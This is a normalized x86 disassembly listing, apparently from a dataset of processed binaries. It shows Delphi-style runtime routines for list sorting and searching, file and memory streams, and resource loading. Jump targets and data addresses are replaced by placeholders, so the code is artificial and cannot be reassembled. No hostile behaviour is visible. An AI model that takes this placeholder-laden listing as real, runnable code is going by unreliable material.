mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028e0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404a6c
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_4161bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4154ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_4154ec
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_416218
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_416218
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41623c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_4162b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4154ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403f4c
pop edi
pop esi
pop ebx
retn
sub_4162f0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4154ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_416318
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41634c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_415840
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_416398
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4154ec
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4154ec
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4163ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_416318
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403f4c
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028e0
sub_416464
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4154ec
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4154ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403f4c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4164c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4154ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_416500
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416218
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416500
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4165b0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41660c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_416500
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_416660
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_416694
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4166f8
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41674c
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403074
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
mov esp ebp
pop ebp
retn
sub_416798
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_40306c
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41674c
pop ecx
mov eax [ ebx ]
call sub_4030b0
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41674c
pop ecx
sub_41681c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41688c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
sub_4168c4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
sub_4168fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_416680
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026e4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4169d8
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4169df
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_402704
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41688c
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_4168c4
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_4169f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4171a4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416a40
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4191d8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416a47
mov eax [ ebp - 0x8 ]
call sub_403124
retn
sub_416a50
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_416aac
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4083b8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_416aec
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cd00
pop ebx
pop ebp
retn 0x8
sub_416b14
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_416b58
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_416b58
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_416c81
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403448
movzx edx di
mov eax esi
call sub_4082dc
mov ecx eax
xor edx edx
mov eax ebx
call sub_416a50
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408358
mov ecx eax
xor edx edx
mov eax ebx
call sub_416a50
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c88
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403f1c
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408570
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40ae60
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408570
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40ae60
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
jmp r-xdata
sub_416c88
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_416cac
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
call sub_4083f0
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_416ce8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028e0
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_416d20
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_416d44
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
call sub_416d70
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_416d88
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_416680
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41688c
sub_416dc0
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_416ce0
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_416de8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_416dc0
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_416e14
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406928
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_40690c
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_4068fc
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
test ecx ecx
jne r-xdata
sub_416ea0
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028e0
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_416dc0
sub_416ef0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403f4c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_416f34
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4041b8
mov esi eax
sub esi [ ebx + 0x8 ]
cmp edi esi
jge r-xdata
lea eax [ ebx + 0x4 ]
call j_sub_4043c4
mov edx [ ebx + 0x8 ]
add eax edx
mov edx ebp
mov ecx esi
call sub_4028e0
add [ ebx + 0x8 ] esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi edi
sub_416f74
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi ecx
mov edx [ ebx + 0x8 ]
add edx esi
lea eax [ ebx + 0x4 ]
call sub_404544
lea eax [ ebx + 0x4 ]
call j_sub_4043c4
mov edx [ ebx + 0x8 ]
lea edx [ eax + edx ]
mov eax edi
mov ecx esi
call sub_4028e0
add [ ebx + 0x8 ] esi
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_416fac
push ebx
push esi
mov esi edx
mov ebx eax
sub cx 0x1
jb r-xdata
mov [ ebx + 0x8 ] esi
jmp r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4041b8
cmp eax [ ebx + 0x8 ]
jge r-xdata
add [ ebx + 0x8 ] esi
jmp r-xdata
dec cx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jge r-xdata
mov eax [ ebx + 0x4 ]
call sub_4041b8
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
call sub_4041b8
sub eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x8 ]
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x8 ] eax
sub_417004
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x4 ]
mov edx esi
call sub_404544
cmp esi [ ebx + 0x8 ]
jge r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] esi
sub_417020
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4043b8
mov ecx eax
mov edx esi
mov eax edi
call sub_4170e8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_417078
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4170db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4170e2
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
sub_4170e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_417078
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_416ce0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_417078
pop ecx
sub_417154
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_4068f8
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4171a4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026e4
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4171ec
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_402704
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_41721c
add [ eax ] al
